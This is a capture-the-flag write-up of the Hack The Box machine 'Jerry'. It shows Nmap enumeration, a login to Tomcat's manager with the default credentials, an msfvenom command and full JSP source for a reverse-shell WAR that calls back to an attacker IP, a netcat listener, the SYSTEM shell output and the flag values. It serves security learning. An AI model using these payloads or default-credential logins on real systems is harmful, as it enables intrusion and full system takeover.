Title: Hack The Box: Jerry
Date: 2023-04-12
Category: Blog
Tags: CTF, Cybersecurity, Hack The Box
Author: Matt Spraggs

This is my fourth write-up in a series on the
[Hack The Box](https://www.hackthebox.com/) Beginner Track. This challenge is
called Jerry, and it's a lot more like a classic
[CTF](https://en.wikipedia.org/wiki/Capture_the_flag_(cybersecurity)) than the
previous two in my view,
[Find the Easy Pass]({filename}/hack-the-box-find-the-easy-pass.md) and
[Weak RSA]({filename}/hack-the-box-weak-rsa.md).

# Enumeration

Firing up the box and our attack machine, let's start with a straightforward
[Nmap](https://nmap.org/) scan:

```shell
$ nmap -Pn -A -T4 jerry.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-11 16:11 GMT
Nmap scan report for jerry.htb (10.129.24.108)
Host is up (0.014s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.75 seconds
```

It looks like there's a web server listening to port 8080, and it's running
Apache Tomcat. [Apache Tomcat](https://en.wikipedia.org/wiki/Apache_Tomcat) is a
web server written in Java and designed to serve
[Jakarta Server Pages](https://en.wikipedia.org/wiki/Jakarta_Server_Pages),
otherwise known as Java Server Pages. Let's head over to `http://jerry.htb:8080`
and take a look:

![Apache Tomcat]({attach}images/hack-the-box-jerry/jerry.htb:8080.png)

There's a few links to dig into here. Clicking on "Server Status", we're
presented with a basic auth login prompt, and we don't have any credentials, so
we can't get in:

![Apache Tomcat HTTP 401]({attach}images/hack-the-box-jerry/http_401.png)

We're not authorised to view the requested page. Instead we're presented with
some helpful information on how to configure Tomcat with the right roles for an
example account. That example account has the username and password "tomcat" and
"s3cret". Let's try those at the login prompt again. Maybe the admin didn't
bother to change the defaults...

![Apache Tomcat Server Status]({attach}images/hack-the-box-jerry/jerry.htb:8080_manager_status.png)

Wow... that was surprisingly straightforward. Okay, so this gives us a bit more
info about the server that Tomcat is running on. Heading back to the landing
page and clicking on "Manager App" gives this:

![Apache Tomcat Manager App]({attach}images/hack-the-box-jerry/jerry.htb:8080_manager_html.png)

Finally, visiting the "Host Manager" link gives us an HTTP 403 Forbidden
response, despite our credentials. This suggest the roles associated with our
user don't have enough permissions to access this page.

# Foothold

Reading around, it seems that the manager app will allow us to install a new
[WAR](https://en.wikipedia.org/wiki/WAR_(file_format)) (Web Application
Resource) application, allowing us to run arbitrary Java code on the server. If
we can install a reverse shell this way, it'll allow us to poke around the
system at our leisure.

The next step is to generate the reverse shell application. For this we can use
`msfvenom`, the part of the [Metasploit](https://www.metasploit.com) framework
used to generate payloads:

```shell
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.52 LPORT=1337 -f war > reverse.war
```

Under the hood, `msfvenom` has generated the following code and compiled it for
us to a WAR file:

```jsp
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream sw;
    OutputStream hd;

    StreamConnector( InputStream sw, OutputStream hd )
    {
      this.sw = sw;
      this.hd = hd;
    }

    public void run()
    {
      BufferedReader nr  = null;
      BufferedWriter alc = null;
      try
      {
        nr  = new BufferedReader( new InputStreamReader( this.sw ) );
        alc = new BufferedWriter( new OutputStreamWriter( this.hd ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = nr.read( buffer, 0, buffer.length ) ) > 0 )
        {
          alc.write( buffer, 0, length );
          alc.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( nr != null )
          nr.close();
        if( alc != null )
          alc.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
    if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
      ShellPath = new String("/bin/sh");
    } else {
      ShellPath = new String("cmd.exe");
    }

    Socket socket = new Socket( "10.10.14.117", 1337 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
```

With the payload in hand, we can install it as a new application using the
manager app console in Tomcat:

![Tomcat App Upload]({attach}images/hack-the-box-jerry/jerry.htb:8080_manager_html_war_deploy.png)

Clicking "deploy", we see the new app in the list:

![Tomcat App Upload]({attach}images/hack-the-box-jerry/jerry.htb:8080_manager_html_applications_list.png)

Next, we open a port on our attack machine using
[netcat](https://en.wikipedia.org/wiki/Netcat) with `nc -nlvp 1337`. Visiting
the URL for the `reverse.war` binary triggers the reverse shell:

```shell
$ curl http://tomcat:s3cret@jerry.htb:8080/reverse/
```

Meanwhile, in our netcat session...

```shell
$ nc -nlvp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.24.108.
Ncat: Connection from 10.129.24.108:49194.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

From here we can poke around the target system, starting with privileges for our
user:

```shell
C:\apache-tomcat-7.0.88>whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
SeLockMemoryPrivilege           Lock pages in memory                      Enabled 
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeTcbPrivilege                  Act as part of the operating system       Enabled 
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Enabled 
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled 
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled 
SeCreatePagefilePrivilege       Create a pagefile                         Enabled 
SeCreatePermanentPrivilege      Create permanent shared objects           Enabled 
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeAuditPrivilege                Generate security audits                  Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled 
SeTimeZonePrivilege             Change the time zone                      Enabled 
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled 


C:\apache-tomcat-7.0.88>
```

Looks like Tomcat is running as the system user, which gives us quite a lot of
power 😈 It also means we don't need to bother with privilege escalation, as we
already have everything we need to read the flags. Heading over to the
Administrator's desktop, the canonical place to find Windows flags in HTB, we
can take a look around:

```shell
C:\apache-tomcat-7.0.88>cd ../Users/Administrator/Desktop
cd ../Users/Administrator/Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)   2,291,466,240 bytes free
```

At this point I sort of expected to find a single file with the flag for the
admin user. Not being a Windows regular, it took me an embarrassing amount of
time to realise that `flags` is in fact a directory...

```shell
C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,289,696,768 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\Users\Administrator\Desktop\flags>
```

Great! All the flags we need in one place.

I'd be lying if I said I found this challenge interesting. It didn't take a lot
of research to find out how to exploit Tomcat, and finding some credentials to
get us to the point where we could do that proved pretty straightforward. The
next challenge, _You Know 0xDiablos_, is a lot more involved from a technical
standpoint, which I think makes it much more engaging.
